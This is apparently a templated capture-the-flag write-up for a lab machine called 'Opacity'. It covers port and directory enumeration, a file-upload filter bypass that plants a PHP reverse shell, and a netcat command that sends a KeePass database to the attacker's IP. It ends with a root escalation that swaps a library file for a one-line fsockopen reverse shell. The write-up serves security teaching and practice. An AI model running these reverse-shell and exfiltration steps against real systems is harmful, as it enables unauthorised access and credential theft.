{% from "macros.html" import console, image, text, code, list, link, header, script, imageModal %}

{{imageModal()}}

{{header("Enumeration", "enumeration")}}

{{text("We start by scanning the ports.")}}

{{console("nmap -T5 -p- 10.10.153.1", "Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-10 17:37 CET
Nmap scan report for 10.10.153.1
Host is up (0.077s latency).
Not shown: 55352 closed tcp ports (conn-refused), 10179 filtered tcp ports (no-response)
PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds

Nmap done: 1 IP address (1 host up) scanned in 387.01 seconds")}}

{{text("We find 4 ports open.")}}

{{list(['22 (SSH)', '80 (HTTP)', '139 (netbios-ssn)', '445 (microsoft-ds)'])}}

{{text("I visited the web page on port 80 and was presented a login page.")}}

{{image("../../static/writeups/opacity/images/000001.jpg")}}

{{text("I didn't have any credentials, so I continued with directory enumerating.")}}

{{console("gobuster dir -u http://10.10.153.1 -w /usr/share/wordlists/dirb/common.txt", "===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.153.1
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.htaccess            (Status: 403) [Size: 276]
/.htpasswd            (Status: 403) [Size: 276]
/cloud                (Status: 301) [Size: 310] [--> http://10.10.153.1/cloud/]
/css                  (Status: 301) [Size: 308] [--> http://10.10.153.1/css/]
/server-status        (Status: 403) [Size: 276]
Progress: 20469 / 20470 (100.00%)
===============================================================
Finished
===============================================================")}}

{{text("<code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>cloud</code> directory looked the most promising so I checked it out.")}}

{{header("Shell as www-data", "shell-as-www-data")}}

{{image("../../static/writeups/opacity/images/000002.jpg")}}

{{text("It seemed like it was a file upload type of site.")}}

{{text("This of course means uploading our own reverse shell any trying to execute it.")}}

{{text("I proceeded to <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>revshells.com</code> and copied the PentestMonkey reverse shell into a file.")}}

{{text("Then I hosted a web server by using python and downloaded the reverse shell by using the website.")}}

{{text("Uploading a file named <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>reverse.php</code> didn't seem to work.")}}

{{text("There was probably a some type of filter in place so I modified the external URL to <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>http://MY_IP/reverse.php .png</code>.")}}

{{text("After setting up a listener and visting the page the file was uploaded to, I got a connection.")}}

{{image("../../static/writeups/opacity/images/000003.jpg")}}

{{header("Shell as sysadmin", "shell-as-sysadmin")}}

{{text("After upgrading my shell, I began looking around the system.")}}

{{text("One interesting thing was a KeePass file inside of the <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>/opt</code> directory.")}}

{{text("I downloaded the file onto my machine by using:")}}

{{text("On my machine")}}

{{console("nc -nlvp 4444 > dataset.kdbx")}}

{{text("On victim machine")}}

{{console("nc MY_IP 4444 < dataset.kdbx")}}

{{text("I needed this database password in order to read it so I used <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>keepas2john</code>.")}}

{{image("../../static/writeups/opacity/images/000004.jpg")}}

{{text("After getting the password, I opened this file using KeePass and got credentials to user <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>sysadmin</code>.")}}

{{image("../../static/writeups/opacity/images/000005.jpg")}}

{{header("Shell as root", "shell-as-root")}}

{{text("After logging in via SSH, I found a <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>script.php</code> file inside of the <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>scripts</code> folder.")}}

{{console("cat script.php", "<?php

//Backup of scripts sysadmin folder
require_once('lib/backup.inc.php');
zipData('/home/sysadmin/scripts', '/var/backups/backup.zip');
echo 'Successful', PHP_EOL;

//Files scheduled removal
$dir = '/var/www/html/cloud/images';
if(file_exists($dir)){
    $di = new RecursiveDirectoryIterator($dir, FilesystemIterator::SKIP_DOTS);
    $ri = new RecursiveIteratorIterator($di, RecursiveIteratorIterator::CHILD_FIRST);
    foreach ( $ri as $file ) {
        $file->isDir() ?  rmdir($file) : unlink($file);
    }
}
?>")}}

{{text("It's a script for creating a backup. The file itself is not writeable so we are not able to edit it.")}}

{{text("We can notice the <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>require_once('lib/backup.inc.php');</code> line calls a library from somewhere else.")}}

{{text("Let's check if the <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>backup.inc.php</code> file is writeable.")}}

{{console("ls -la", "drwxr-xr-x 2 sysadmin root  4096 Jul 26  2022 .
drwxr-xr-x 3 root     root  4096 Jul  8  2022 ..
-rw-r--r-- 1 root     root  9458 Jul 26  2022 application.php
-rw-r--r-- 1 root     root   967 Jul  6  2022 backup.inc.php
-rw-r--r-- 1 root     root 24514 Jul 26  2022 bio2rdfapi.php
...")}}

{{text("It is not writeable, but the directory itself is. That means we can just swap the file with a different one that uses the same name.")}}

{{text("I moved <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>backup.inc.php</code> to my home directory and edited it so that it would give me a reverse shell.")}}

{{console("cat backup.inc.php", "$sock=fsockopen('10.9.6.6',1234);exec('bash <&3 >&3 2>&3');")}}

{{text("Then I moved it back to <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>scripts/lib</code>, set up a listener and waited for a connection.")}}

{{text("After some time, I got a reverse shell as root.")}}

{{script()}}